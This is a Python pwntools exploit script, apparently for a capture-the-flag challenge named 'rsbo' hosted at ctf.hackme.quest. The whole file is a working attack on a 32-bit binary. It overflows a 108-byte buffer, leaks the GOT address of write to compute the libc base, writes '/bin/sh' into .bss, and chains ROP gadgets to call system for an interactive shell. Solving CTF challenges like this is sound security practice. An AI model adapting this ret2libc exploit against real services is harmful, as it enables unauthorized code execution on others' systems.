from pwn import *

#r = process("./asset/rsbo")
r = remote("ctf.hackme.quest", 7706)
lib = ELF('./asset/libc-2.23.so.i386')
elf = ELF("./asset/rsbo")
write_address = lib.sym['write']
system_address = lib.sym['system']
read_addr = 0x80483e0
write_addr = 0x8048450
write_got = elf.got['write']
pop_esi_edi_ebp = 0x0804879d
data = elf.bss() 
start_addr = elf.sym['_start']

rop_get_write = [
    write_addr,
    start_addr,
    p32(1),
    write_got,
    p32(0x4)
]
rop_write_shell = [
    read_addr,
    start_addr,
    p32(0),
    data,
    p32(8)
]
#input()

num = 0
p = num.to_bytes(1, 'little') * 108 + flat(rop_get_write)
r.send(p)
write_addr_2 = r.recv(4)
write_addr_2 = int.from_bytes(write_addr_2, 'little')
base = write_addr_2 - lib.sym['write']
print("write_addr_2:", hex(write_addr_2), " write got:", hex(write_got))
p = num.to_bytes(1, 'little') * 108 + flat(rop_write_shell)
r.send(p)
r.send(b'/bin/sh\0')
print("system address:", hex(system_address))
rop_get_shell = [
    base + lib.sym['system'],
    p32(0xdeadbeff),
    data
]
p = num.to_bytes(1, 'little') * 108 + flat(rop_get_shell)
r.send(p)

r.interactive()